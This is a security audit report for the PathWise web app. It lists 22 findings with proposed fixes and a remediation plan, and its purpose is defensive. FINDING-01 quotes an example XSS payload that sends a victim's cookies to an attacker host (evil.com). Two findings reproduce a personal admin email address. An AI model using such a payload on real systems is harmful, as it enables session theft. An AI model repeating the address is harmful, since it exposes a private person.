# PathWise Security Audit & Hardening Plan

**Audit date:** 2026-04-06
**Auditor:** Principal Security Review
**Scope:** All backend services, frontend API client, infrastructure config

---

## Executive Summary

PathWise has a solid security foundation: parameterized SQL queries prevent injection, bcrypt with 12 rounds is used for password hashing, timing-attack mitigation is in place on signin, and authorization checks exist on most endpoints. However, the audit identified **4 CRITICAL**, **7 HIGH**, **6 MEDIUM**, and **5 LOW** findings that should be addressed to reach production-grade security posture.

---

## Findings

---

### FINDING-01: XSS via HTML email injection in admin ticket notification

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `backend/email/email.ts:197` |
| **Priority** | Fix now |

**Description:** The `adminTicketNotificationEmail` function interpolates `ticketMessage`, `ticketName`, `ticketEmail`, and `ticketSubject` directly into HTML without escaping. An attacker can submit a support ticket with a message like `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` or `<img src=x onerror=...>`. When the admin opens this email in a mail client that renders HTML, the script executes.

The `.replace(/\n/g, "<br>")` on line 197 does not sanitize HTML entities.

**Fix:**
```typescript
// Add an HTML escape function to email.ts
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// Apply to ALL user-supplied values in adminTicketNotificationEmail:
export function adminTicketNotificationEmail(
  ticketName: string,
  ticketEmail: string,
  ticketSubject: string,
  ticketMessage: string
): { subject: string; html: string } {
  const safeName = escapeHtml(ticketName);
  const safeEmail = escapeHtml(ticketEmail);
  const safeSubject = escapeHtml(ticketSubject);
  const safeMessage = escapeHtml(ticketMessage).replace(/\n/g, "<br>");
  // ... use safe* variables in the template
}

// Also escape in welcomeEmail and contactConfirmationEmail:
// The `name` parameter is interpolated into HTML — escape it.
```

Also escape the `subject` line in `sendEmail` is not HTML, but the subject is used in `adminTicketNotificationEmail`'s subject line (`${ticketSubject || ticketName}`) which could contain encoded chars. The Resend API likely handles subject encoding, but the HTML body must be escaped.

---

### FINDING-02: `awardAchievement` is a public exposed endpoint allowing self-award

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `backend/streaks/streaks.ts:163-184` |
| **Priority** | Fix now |

**Description:** The `awardAchievement` endpoint is `expose: true` with `auth: true` and checks `userID !== userId`. This means any authenticated user can award ANY badge to themselves by calling `POST /streaks/achievements/award` with their own `userId` and any `badgeKey`. This completely undermines the achievement/gamification system.

Internal service-to-service calls from `tasks.ts`, `roadmap.ts`, and `assessment.ts` use this same endpoint, but they run as the authenticated user's context, so the `userID !== userId` check passes.

**Fix:** Change to an internal-only endpoint:
```typescript
export const awardAchievement = api(
  { expose: false },  // <-- internal only, not reachable from outside
  async ({ userId, badgeKey }: { userId: string; badgeKey: string }): Promise<{ success: boolean }> => {
    // Remove the auth check since this is now internal-only
    const badge = BADGES.find(b => b.key === badgeKey);
    if (!badge) throw APIError.notFound("badge not found");
    // ... rest of logic
  }
);
```

Remove the frontend's `achievements.award()` call in `src/lib/api.ts:143` as well.

---

### FINDING-03: JWT token expiry of 30 days is excessive

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `backend/auth/auth.ts:564` |
| **Priority** | Fix now |

**Description:** Tokens expire after 30 days with no refresh mechanism and no revocation capability. If a token is compromised (stolen from localStorage, XSS, shared computer), the attacker has 30 days of access. There is no way to invalidate a compromised token without changing the JWT secret (which logs out ALL users).

**Fix (phased):**

Phase 1 (immediate): Reduce expiry to 7 days.
```typescript
function issueToken(userId: string): string {
  return jwt.sign({ sub: userId }, jwtSecret(), { expiresIn: "7d" });
}
```

Phase 2 (soon): Implement a refresh token flow:
- Short-lived access token (15 min)
- Long-lived refresh token (7 days) stored in httpOnly cookie
- `/auth/refresh` endpoint to issue new access tokens
- Token revocation table to block compromised refresh tokens

---

### FINDING-04: Admin impersonation tokens are indistinguishable from real tokens

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `backend/auth/auth.ts:360-369` |
| **Priority** | Fix now |

**Description:** `adminImpersonate` issues a standard JWT for the target user with no audit trail, no expiry differentiation, and no way to distinguish it from a real login. If the admin account is compromised, the attacker can impersonate any user silently. Even in normal operation, there is no log of who impersonated whom.

**Fix:**
```typescript
export const adminImpersonate = api(
  { expose: true, method: "POST", path: "/admin/impersonate/:userId", auth: true },
  async ({ userId }: { userId: string }): Promise<{ token: string }> => {
    const { userID } = getAuthData<AuthData>()!;
    await requireAdmin(userID);
    RateLimits.admin("admin:" + userID);  // Add rate limiting
    const row = await db.queryRow`SELECT id FROM users WHERE id = ${userId}`;
    if (!row) throw APIError.notFound("user not found");

    // Issue a short-lived impersonation token with audit metadata
    const token = jwt.sign(
      { sub: userId, impersonatedBy: userID, iss: "pathwise-admin" },
      jwtSecret(),
      { expiresIn: "1h" }  // Short expiry for impersonation
    );

    // Log the impersonation event
    console.log(JSON.stringify({
      level: "warn",
      action: "admin_impersonate",
      adminId: userID,
      targetUserId: userId,
      timestamp: new Date().toISOString(),
    }));

    return { token };
  }
);
```

---

### FINDING-05: No email format validation anywhere

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/auth/auth.ts:80-118` (signup), `backend/tickets/tickets.ts:23-62` (submitTicket) |
| **Priority** | Fix now |

**Description:** Neither signup nor the ticket submission endpoint validates email format. This allows:
- Registering accounts with invalid emails (e.g., `not-an-email`, empty string)
- Submitting tickets with invalid emails, wasting Resend API credits
- Potential email header injection if the email service doesn't sanitize (Resend likely does, but defense-in-depth applies)

**Fix:**
```typescript
// backend/shared/validation.ts
const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

export function validateEmail(email: string): void {
  if (!email || !EMAIL_REGEX.test(email.trim())) {
    throw APIError.invalidArgument("invalid email address");
  }
}

export function validateStringLength(
  value: string,
  field: string,
  min: number,
  max: number
): void {
  if (value.length < min) throw APIError.invalidArgument(`${field} must be at least ${min} characters`);
  if (value.length > max) throw APIError.invalidArgument(`${field} must be at most ${max} characters`);
}
```

Apply to: `signup`, `signin`, `submitTicket`, `sendEmail`.

---

### FINDING-06: No input length validation on name, headline, bio, and other string fields

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/auth/auth.ts:80` (signup name), `backend/auth/auth.ts:516` (headline, bio) |
| **Priority** | Fix now |

**Description:** There are no maximum length constraints on:
- `name` at signup (could be megabytes of text)
- `headline` and `bio` in profile settings (unbounded)
- `title` and `description` on tasks
- `milestoneTitle` and `milestoneDescription` on task generation
- `name`, `issuer` on certificates

An attacker can store massive payloads in the database, inflate response sizes, and potentially cause OOM or slow queries.

**Fix:** Add length validation at each endpoint boundary. Recommended limits:
- `name`: max 100 chars
- `email`: max 254 chars (RFC 5321)
- `headline`: max 200 chars
- `bio`: max 2000 chars
- `title` (tasks): max 200 chars
- `description` (tasks): max 2000 chars
- `message` (tickets): max 5000 chars
- Certificate `name`/`issuer`: max 200 chars

---

### FINDING-07: No password complexity enforcement beyond minimum length

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/auth/auth.ts:84, 249` |
| **Priority** | Fix soon |

**Description:** Password validation only checks `length >= 8`. No maximum length check either, which is a bcrypt concern -- bcrypt silently truncates at 72 bytes, so a user who sets a 100-char password only has 72 bytes of entropy, creating a false sense of security. No check for common/breached passwords.

**Fix:**
```typescript
function validatePassword(password: string): void {
  if (password.length < 8) {
    throw APIError.invalidArgument("password must be at least 8 characters");
  }
  if (password.length > 72) {
    throw APIError.invalidArgument("password must be at most 72 characters");
  }
  // Optional: check against top-1000 common passwords list
}
```

---

### FINDING-08: `adminListUsers` returns unbounded results with no pagination

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/auth/auth.ts:291-314` |
| **Priority** | Fix soon |

**Description:** The admin users list, admin tickets list, admin analytics career matches scan, and admin assessment stats all return unbounded result sets. As the user base grows, these endpoints will:
- Time out or OOM
- Create slow queries
- Transfer large payloads

Other unbounded queries:
- `backend/tickets/tickets.ts:89` (adminListTickets)
- `backend/assessment/assessment.ts:329` (adminAssessmentStats)
- `backend/assessment/assessment.ts:392` (adminAnalytics -- scans ALL career_matches JSON)
- `backend/tasks/tasks.ts:46` (listTasks for a user -- could have thousands of tasks)

**Fix:** Add `LIMIT` / `OFFSET` pagination:
```typescript
// Example for adminListUsers
async ({ page = 1, perPage = 50 }: { page?: number; perPage?: number }): Promise<...> => {
  const offset = (Math.max(1, page) - 1) * Math.min(perPage, 100);
  const rows = db.query`
    SELECT ... FROM users ORDER BY created_at DESC
    LIMIT ${Math.min(perPage, 100)} OFFSET ${offset}
  `;
  // ...
}
```

---

### FINDING-09: Hardcoded admin email is a single point of failure

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/auth/auth.ts:270, 437` |
| **Priority** | Fix soon |

**Description:** `const ADMIN_EMAIL = "akashagakash@gmail.com"` is hardcoded in source code and duplicated on line 437. This means:
- Adding/removing admins requires a code deploy
- The admin email is visible in version control
- No role-based access control -- a single admin with full access to everything
- The duplicate on line 437 could drift from the constant on line 270

**Fix:**
1. Immediate: Use an Encore secret for the admin email(s):
   ```typescript
   const adminEmails = secret("AdminEmails"); // comma-separated
   async function requireAdmin(userID: string): Promise<void> {
     const row = await db.queryRow`SELECT email FROM users WHERE id = ${userID}`;
     const admins = adminEmails().split(",").map(e => e.trim().toLowerCase());
     if (!row || !admins.includes(row.email.toLowerCase())) {
       throw APIError.permissionDenied("admin access required");
     }
   }
   ```
2. Long-term: Add a `role` column to the `users` table with values like `user`, `admin`, `super_admin`.

---

### FINDING-10: CORS allows all origins without credentials

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `backend/encore.app` (global_cors config) |
| **Priority** | Fix soon |

**Description:** The CORS config has `"allow_origins_without_credentials": ["*"]`. While this only applies to requests WITHOUT credentials (no cookies/auth headers), it means any origin can call unauthenticated endpoints like `/auth/signup`, `/auth/signin`, `/tickets`, and `/profile/:slug`. This enables:
- Automated account creation from any origin
- Credential stuffing attacks from any origin
- Contact form spam from any origin

The rate limiter mitigates this partially, but the rate limiter keys on email/userId, not IP, so an attacker can rotate emails.

**Fix:** Restrict to known origins:
```json
{
  "allow_origins_without_credentials": [
    "https://pathwise.fit",
    "https://www.pathwise.fit",
    "https://pathwise-mu.vercel.app",
    "http://localhost:5173"
  ]
}
```

---

### FINDING-11: No CSP (Content Security Policy) headers

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `index.html` |
| **Priority** | Fix soon |

**Description:** The `index.html` loads scripts from three external domains (Google Analytics, Microsoft Clarity, PostHog) with no Content Security Policy header restricting which scripts can execute. If any of these third-party scripts are compromised, or if an attacker finds an XSS vector, there is no CSP to limit the damage.

**Fix:** Add a CSP meta tag (or better, set via HTTP header in Vercel config):
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://www.googletagmanager.com https://www.clarity.ms https://us.i.posthog.com 'unsafe-inline';
  connect-src 'self' https://staging-pathwise-4mxi.encr.app https://www.google-analytics.com https://us.i.posthog.com https://www.clarity.ms;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
  font-src 'self' data:;
  frame-src 'none';
">
```

Or via `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Content-Security-Policy", "value": "default-src 'self'; ..." }
      ]
    }
  ]
}
```

---

### FINDING-12: PostHog receives PII (email, name) on identify

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `src/lib/auth-context.tsx:40, 57-61` |
| **Priority** | Fix soon |

**Description:** `posthog.identify(u.id, { email: u.email, name: u.name, plan: u.plan })` sends the user's email and name to PostHog on every login. This may violate GDPR/privacy policies and sends PII to a third-party analytics service. The same data goes to Clarity and Google Analytics via automatic page tracking.

**Fix:**
```typescript
// Only send non-PII identifiers
posthog.identify(u.id, { plan: u.plan });
// Or hash the email before sending
posthog.identify(u.id, { plan: u.plan, emailHash: await sha256(u.email) });
```

Review Clarity and GA configurations to ensure they are not capturing form inputs or PII.

---

### FINDING-13: In-memory rate limiter does not survive restarts or scale horizontally

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `backend/shared/rate-limiter.ts` |
| **Priority** | Fix soon |

**Description:** The rate limiter uses an in-memory `Map`. This means:
- Rate limits reset on every server restart/deploy
- If Encore scales to multiple instances, each instance has its own counter (limits effectively multiply)
- The cleanup `setInterval` keeps the process alive even during graceful shutdown

For the current single-instance Encore deployment, this works. But it's a known limitation that should be addressed before scaling.

**Fix (when scaling):**
- Use Encore's built-in Redis cache or an external Redis instance
- Implement a sliding window counter in Redis with `MULTI/EXEC`
- Alternatively, use Encore's rate limiting middleware if available

---

### FINDING-14: Rate limiter keys on email/userId, not IP -- abuse vector

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `backend/auth/auth.ts:83, 131`, `backend/tickets/tickets.ts:26` |
| **Priority** | Fix soon |

**Description:** Auth rate limits key on `"signup:" + params.email` and `"signin:" + params.email`. An attacker can:
- Attempt credential stuffing with different emails each time (no per-IP limit)
- Create many accounts by rotating email addresses
- Spam the contact form by rotating email addresses

The ticket rate limit keys on `"ticket:" + params.email`, same issue.

**Fix:** Add a secondary per-IP rate limit. Encore may provide request metadata with the client IP:
```typescript
// Double-key: per-email AND per-IP
RateLimits.auth("signup:" + params.email);
RateLimits.auth("signup-ip:" + clientIP);  // Need to extract IP from request context
```

---

### FINDING-15: `createTask` allows unauthenticated internal calls with user-supplied userId

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `backend/tasks/tasks.ts:86-88` |
| **Priority** | Fix soon |

**Description:** The `createTask` endpoint has `expose: true` and `auth: true`, but the auth check is conditional:
```typescript
const auth = getAuthData<AuthData>();
if (auth && auth.userID !== params.userId) throw APIError.permissionDenied("not your data");
```

The intent is to allow service-to-service calls (from roadmap generation) where `getAuthData()` returns null. However, since the endpoint is `expose: true` and `auth: true`, Encore's auth middleware should ensure `getAuthData()` is never null for external requests. The code is correct by Encore's contract, but the conditional check is confusing and fragile.

**Fix:** Split into two endpoints:
```typescript
// External endpoint -- strict auth
export const createTask = api(
  { expose: true, method: "POST", path: "/tasks", auth: true },
  async (params: CreateTaskParams): Promise<TaskResponse> => {
    const { userID } = getAuthData<AuthData>()!;
    if (userID !== params.userId) throw APIError.permissionDenied("not your data");
    return createTaskInternal(params);
  }
);

// Internal endpoint -- no auth, service-to-service only
export const createTaskInternal = api(
  { expose: false },
  async (params: CreateTaskParams): Promise<TaskResponse> => {
    // ... task creation logic
  }
);
```

---

### FINDING-16: `exportData` uses `any` return type

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `backend/auth/auth.ts:454` |
| **Priority** | Fix soon |

**Description:** `async (): Promise<{ data: any }>` -- the `any` type means the response shape is not validated and could accidentally leak internal fields in the future. Similarly, `adminGetAssessment` on `assessment.ts:354` returns `Promise<any>`.

**Fix:** Define explicit response interfaces for both endpoints.

---

### FINDING-17: Streaks service uses `as any` casts throughout, masking potential runtime errors

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `backend/streaks/streaks.ts:56-65, 87, 135, 140, 212, 263` |
| **Priority** | Fix soon |

**Description:** Eleven instances of `as any` casts on database row results. If a column name changes in a migration, these casts silently produce `undefined` instead of a compile error.

**Fix:** Define typed row interfaces:
```typescript
interface StreakRow {
  current_streak: number;
  best_streak: number;
  last_active_date: string | null;
  consistency_score: number;
  total_xp: number;
}
// Then: const row = await db.queryRow<StreakRow>`...`;
```

---

### FINDING-18: Ticket email sends to hardcoded admin address

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `backend/tickets/tickets.ts:57` |
| **Priority** | Monitor |

**Description:** `await sendEmail({ to: "akashagakash@gmail.com", ...notify })` -- admin email is hardcoded in yet another file (third location). Should reference the same constant or secret.

**Fix:** Import `ADMIN_EMAIL` from auth or use a shared secret.

---

### FINDING-19: Silent error swallowing throughout the codebase

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | Multiple: `auth.ts:111`, `auth.ts:336`, `auth.ts:442`, `assessment.ts:142`, `roadmap.ts:324`, and more |
| **Priority** | Fix soon |

**Description:** Empty `catch {}` blocks appear 15+ times across the backend. While some are intentional fire-and-forget (emails, achievements), they mask real errors in production. Failed email sends, failed achievement awards, and failed cascade deletes will never surface.

**Fix:** At minimum, log at `warn` level in catch blocks:
```typescript
try { await awardAchievement(...); } catch (err) {
  console.warn("Failed to award achievement:", err instanceof Error ? err.message : "unknown");
}
```

---

### FINDING-20: Token stored in localStorage (XSS-accessible)

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `src/lib/api.ts:25-28` |
| **Priority** | Monitor |

**Description:** JWT tokens are stored in `localStorage`, which is accessible to any JavaScript running on the page. If an XSS vulnerability exists (or a compromised third-party script), the token can be exfiltrated. This is a common pattern in SPAs but is less secure than httpOnly cookies.

**Fix (long-term):** Migrate to httpOnly, Secure, SameSite=Strict cookie-based auth:
- Backend sets the cookie on login
- Frontend sends credentials automatically
- No JavaScript access to the token

This requires backend changes to set cookies and CSRF protection. The current approach is acceptable if CSP is properly configured (FINDING-11) to prevent XSS.

---

### FINDING-21: `adminUpdatePlan` missing rate limit

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `backend/auth/auth.ts:345-356` |
| **Priority** | Fix soon |

**Description:** The `adminUpdatePlan` endpoint does not call `RateLimits.admin()`, unlike the other admin endpoints. This is inconsistent and could allow rapid plan toggling if the admin account is compromised.

**Fix:**
```typescript
export const adminUpdatePlan = api(
  { expose: true, method: "PATCH", path: "/admin/users/:userId/plan", auth: true },
  async ({ userId, plan }: { userId: string; plan: string }): Promise<{ success: boolean }> => {
    const { userID } = getAuthData<AuthData>()!;
    RateLimits.admin("admin:" + userID);  // Add this
    await requireAdmin(userID);
    // ...
  }
);
```

---

### FINDING-22: User deletion does not cascade to tasks, roadmap, streaks, or assessment data

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `backend/auth/auth.ts:321-341` (adminDeleteUser), `backend/auth/auth.ts:429-448` (deleteAccount) |
| **Priority** | Fix soon |

**Description:** When a user is deleted (either by admin or self-service), only `user_oauth_providers` and `users` rows are deleted. Data in the `assessment`, `roadmap`, `tasks`, `streaks`, `achievements`, `certificates`, and `notifications` tables is orphaned. This is both a data hygiene issue and a GDPR compliance problem (right to erasure requires ALL personal data to be deleted).

**Fix:** Call the admin delete endpoints for all services, or add cascading deletes:
```typescript
// In deleteAccount and adminDeleteUser:
try { await adminDeleteUserAssessment({ userId }); } catch (e) { /* log */ }
try { await adminDeleteUserRoadmap({ userId }); } catch (e) { /* log */ }
try { await adminDeleteUserTasks({ userId }); } catch (e) { /* log */ }
try { await adminDeleteUserStreaks({ userId }); } catch (e) { /* log */ }
// Then delete the user
```

---

## Items NOT Found (Positive Findings)

These security controls are already properly implemented:

| Control | Status | Notes |
|---------|--------|-------|
| SQL injection protection | PASS | All queries use Encore's tagged template literals (parameterized) |
| Password hashing | PASS | bcrypt with 12 rounds -- industry standard |
| Timing attack mitigation on signin | PASS | Constant-time bcrypt compare with dummy hash (line 138) |
| IDOR on user data endpoints | PASS | All data endpoints verify `userID === userId` from auth context |
| Avatar URL validation | PASS | Protocol whitelist (http/https only) prevents `javascript:` URIs |
| Profile slug sanitization | PASS | Regex strips non-alphanumeric chars, length validated |
| Prompt injection defense | PASS | `sanitizeForPrompt()` strips known injection patterns |
| Admin auth on admin endpoints | PASS | All admin endpoints call `requireAdmin()` or `checkAdmin()` |
| JWT secret management | PASS | Stored via Encore secrets, not in code |
| No `dangerouslySetInnerHTML` in React | PASS | No instances found in frontend code |
| Auth required on data endpoints | PASS | All user data endpoints have `auth: true` |
| Notifications bounded | PASS | `LIMIT 50` on notification queries |

---

## Prioritized Remediation Plan

### Phase 1: Fix Now (Week 1)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 1 | FINDING-01: HTML escape email templates | 1h | Prevents XSS on admin |
| 2 | FINDING-02: Make `awardAchievement` internal-only | 30m | Prevents badge self-award |
| 3 | FINDING-04: Add audit trail + short expiry to impersonation | 1h | Limits impersonation blast radius |
| 4 | FINDING-05: Add email validation | 1h | Prevents invalid data + abuse |
| 5 | FINDING-06: Add length validation to all string inputs | 2h | Prevents storage abuse |
| 6 | FINDING-21: Add rate limit to adminUpdatePlan | 5m | Consistency |

### Phase 2: Fix Soon (Weeks 2-3)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 7 | FINDING-03: Reduce JWT expiry to 7d | 15m | Limits token compromise window |
| 8 | FINDING-07: Add password max length (72) | 15m | Prevents bcrypt truncation confusion |
| 9 | FINDING-08: Add pagination to admin + list endpoints | 3h | Prevents unbounded queries |
| 10 | FINDING-09: Move admin email to Encore secret | 30m | Removes hardcoded credential |
| 11 | FINDING-10: Restrict CORS for unauthenticated origins | 15m | Reduces attack surface |
| 12 | FINDING-11: Add CSP headers | 1h | XSS defense-in-depth |
| 13 | FINDING-15: Split createTask into public + internal | 1h | Cleaner auth boundary |
| 14 | FINDING-19: Add warn-level logging to catch blocks | 1h | Observability |
| 15 | FINDING-22: Cascade user deletion to all services | 2h | GDPR compliance |

### Phase 3: Improve (Weeks 4-6)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 16 | FINDING-03 Phase 2: Implement refresh token flow | 8h | Proper token lifecycle |
| 17 | FINDING-12: Stop sending PII to PostHog | 30m | Privacy compliance |
| 18 | FINDING-13: Migrate rate limiter to Redis | 4h | Horizontal scaling ready |
| 19 | FINDING-14: Add per-IP rate limiting | 2h | Anti-abuse |
| 20 | FINDING-16 + 17: Remove all `any` types | 2h | Type safety |
| 21 | FINDING-20: Migrate to httpOnly cookie auth | 8h | Token theft prevention |
| 22 | FINDING-09 long-term: Add `role` column to users table | 4h | Proper RBAC |

### Phase 4: Monitor (Ongoing)

- Track third-party script integrity (Clarity, GA, PostHog) with SRI hashes
- Monitor for dependency vulnerabilities via `npm audit` in CI
- Set up alerts for failed auth attempts (brute force detection)
- Review Resend email delivery logs for injection attempts
- Add SPF/DKIM/DMARC records for `pathwise.fit` domain (verify in DNS)

---

## Total Estimated Effort

| Phase | Effort | Risk Reduction |
|-------|--------|----------------|
| Phase 1 | ~6 hours | Eliminates all CRITICAL + most HIGH findings |
| Phase 2 | ~10 hours | Addresses remaining HIGH + MEDIUM findings |
| Phase 3 | ~28 hours | Hardens for scale + compliance |
| Phase 4 | Ongoing | Continuous security posture |

---

## Appendix: Files Audited

| File | Lines | Key Security Features |
|------|-------|----------------------|
| `backend/auth/auth.ts` | 566 | Auth handler, JWT, bcrypt, admin checks |
| `backend/assessment/assessment.ts` | 413 | IDOR checks, admin auth |
| `backend/roadmap/roadmap.ts` | 419 | IDOR checks, admin auth, milestone ownership |
| `backend/tasks/tasks.ts` | 450 | IDOR checks, admin auth, sanitization |
| `backend/streaks/streaks.ts` | 301 | IDOR checks, achievement system |
| `backend/tickets/tickets.ts` | 162 | Public endpoint, rate limiting |
| `backend/email/email.ts` | 204 | Email templating, Resend integration |
| `backend/shared/rate-limiter.ts` | 88 | In-memory sliding window |
| `backend/shared/sanitize.ts` | 49 | Prompt injection defense |
| `src/lib/api.ts` | 188 | Token storage, API client |
| `index.html` | 39 | Third-party scripts, no CSP |
| `backend/encore.app` | JSON | CORS configuration |
